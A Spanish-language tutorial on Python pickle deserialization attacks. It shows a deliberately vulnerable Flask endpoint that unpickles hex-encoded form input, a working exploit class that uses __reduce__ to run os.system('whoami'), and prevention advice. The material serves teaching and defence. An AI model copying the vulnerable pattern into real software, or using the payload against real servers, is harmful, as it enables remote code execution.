

# Ataque de Deserialización Pickle en Python (DES-Pickle)

El Ataque de Deserialización Pickle (DES-Pickle) es una vulnerabilidad que ocurre cuando se deserializan datos no confiables utilizando el módulo `pickle` de Python. Este tipo de ataque puede permitir a un atacante ejecutar código malicioso de forma remota, comprometiendo la seguridad del sistema.

## Descripción del Ataque

El módulo `pickle` de Python se utiliza para serializar y deserializar objetos Python. Sin embargo, si se utiliza de manera incorrecta, puede ser vulnerable a ataques de deserialización, donde un atacante podría manipular los datos serializados para ejecutar código malicioso al deserializarlos.

## Ejemplo de Código Vulnerable

Consideremos el siguiente código Flask, que muestra una vulnerabilidad de deserialización Pickle:

```python
import pickle
from flask import Flask, request, render_template

app = Flask(__name__, static_url_path='/static', static_folder='static')
app.config['DEBUG'] = True

@app.route("/")
def start():
    user = {'name': 'ZeroCool'}
    with open('filename.pickle', 'wb') as handle:
        pickle.dump(user, handle, protocol=pickle.HIGHEST_PROTOCOL)
    with open('filename.pickle', 'rb') as handle:
        a = pickle.load(handle)
    return render_template("index.html", content = a)

@app.route("/sync", methods=['POST'])
def deserialization():
    with open("pickle.hacker", "wb+") as file:
        att = request.form['data_obj']
        attack = bytes.fromhex(att)
        file.write(attack)
        file.close()
    with open('pickle.hacker', 'rb') as handle:
        a = pickle.load(handle)
        print(attack)
        return render_template("index.html", content = a)

@app.errorhandler(404)
def page_not_found(e):
    return render_template("404.html")

if __name__ == "__main__":
    app.run(host='0.0.0.0')
```

En este código, se utilizan las funciones `pickle.dump()` y `pickle.load()` para serializar y deserializar datos. La vulnerabilidad radica en que los datos de entrada en el formulario web `data_obj` se deserializan sin una validación adecuada, lo que podría permitir que un atacante inyecte código malicioso y lo ejecute en el servidor.

## Exploit

A continuación, se muestra un ejemplo de exploit que aprovecha esta vulnerabilidad para ejecutar el comando `whoami` en el servidor:

```python
import pickle
import os
import binascii 

class RunBinSh(object):
  def __reduce__(self):
    return (os.system,('whoami',))

print(binascii.hexlify(pickle.dumps(RunBinSh())))
```

Este exploit crea un objeto `RunBinSh` que, al ser deserializado por `pickle`, ejecutará el comando `whoami` en el servidor. El objeto se serializa utilizando `pickle.dumps()`, y luego se imprime en formato hexadecimal para ser enviado al servidor vulnerable.

## Prevención

Para prevenir el Ataque de Deserialización Pickle, es crucial implementar medidas de seguridad adecuadas:

- **Validación de Entrada:** Validar y sanitizar todos los datos de entrada antes de deserializarlos para evitar la ejecución de código malicioso.
  
- **Utilizar Funciones Seguras:** Evitar el uso de `pickle` para deserializar datos no confiables. En su lugar, considere el uso de formatos de serialización más seguros, como JSON.

- **Limitar Privilegios:** Ejecutar la aplicación con los privilegios mínimos necesarios para limitar el impacto en caso de una explotación exitosa.

Al seguir estas mejores prácticas, los desarrolladores pueden mitigar el riesgo de deserialización Pickle maliciosa y proteger sus aplicaciones contra este tipo de ataques.